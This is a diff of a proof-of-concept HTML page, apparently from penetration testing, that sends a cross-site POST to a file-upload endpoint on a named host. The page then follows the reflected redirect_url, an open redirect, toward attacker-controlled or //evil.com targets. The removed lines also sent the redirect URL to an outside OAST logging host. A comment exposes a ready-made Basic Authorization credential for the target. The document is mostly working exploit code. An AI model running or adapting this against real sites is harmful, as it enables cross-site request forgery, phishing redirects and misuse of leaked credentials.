@@ -1,32 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Upload Open Redirect CSRF - no credentials</title></head>
-<body>
-<h1>CSRF fetch without credentials - upload open redirect</h1>
+<form id="f" style="display:none">
+  <input name="blob[filename]" value="x.txt">
+  <input name="blob[content_type]" value="text/plain">
+  <input name="blob[byte_size]" value="4">
+  <input name="blob[checksum]" value="U29tZQ==">
+</form>
 <script>
-// Fetch to upload endpoint without credentials, server reflects Referer as redirect_url
-fetch("https://pentest.cdd.io/vaults/1050593102/active_storage_direct_uploads", {
-  method: "POST",
-  // No credentials - as requested
-  headers: {
-    "Content-Type": "application/json",
-    "Accept": "application/json",
-    "X-Requested-With": "XMLHttpRequest"
-  },
-  body: JSON.stringify({blob:{filename:"x.txt",content_type:"text/plain",byte_size:4,checksum:"U29tZQ=="}})
+const fd = new FormData(document.getElementById('f'));
+// or URLSearchParams for x-www-form-urlencoded
+fetch("https://pentest.cdd.io/vaults/1050593102/active_storage_direct_uploads",{
+  method:"POST",
+  body: fd, // browser sets Content-Type multipart/form-data + Origin: https://daplq...oast.pro/file.html + Referer
+  headers:{ "X-Requested-With":"XMLHttpRequest","Accept":"application/json" }
+  // no credentials as requested, no Authorization - will be 401 unless Basic Auth cached; add "Authorization":"Basic Y2RkOmNvbm5lY3Rfc2hhcmluZ19lbnRpdGxlZF9kYW5l" if needed
 }).then(r=>r.json()).then(j=>{
-  console.log("JSON", j);
-  document.body.innerHTML += "<pre>"+JSON.stringify(j,null,2)+"</pre>";
-  if(j.redirect_url){
-    // This is //evil.com or https://attacker.com/file.html depending on Referer
-    // For poc hosted on https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/file.html it will be that OAST URL
-    document.body.innerHTML += "<p>Would redirect to: "+j.redirect_url+"</p>";
-    // Uncomment to actually redirect (like cdd_direct_upload.ts:361)
-    // window.location.href = j.redirect_url;
-    fetch("https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/log?r="+encodeURIComponent(j.redirect_url), {mode:"no-cors"});
-  }
-}).catch(e=>console.log(e));
+  console.log(j); // -> {"redirect_url":"https://daplq.../file.html"} reflects Referer
+  if(j.redirect_url) location.href=j.redirect_url; // //evil.com bypass cdd_direct_upload.ts:422
+});
 </script>
-<p>Host this on https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/file.html or https://evil.com/file.html and visit - check OAST for hit.</p>
-</body>
 </html>
